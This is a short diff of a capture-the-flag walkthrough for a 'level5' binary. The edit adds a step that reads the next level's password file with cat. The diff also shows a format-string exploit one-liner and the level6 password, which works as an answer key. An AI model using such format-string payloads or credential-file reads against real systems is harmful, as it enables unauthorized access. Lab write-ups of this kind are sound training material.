@@ -30,7 +30,10 @@
 6. Execute the exploit:
    (python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x%4$hn%31904x%5$hn"'; cat) | ./level5
 
-7. Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+7. Get the password:
+   cat /home/user/level6/.pass
 
-8. Exit and login as level6:
+8. Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+9. Exit and login as level6:
    su level6
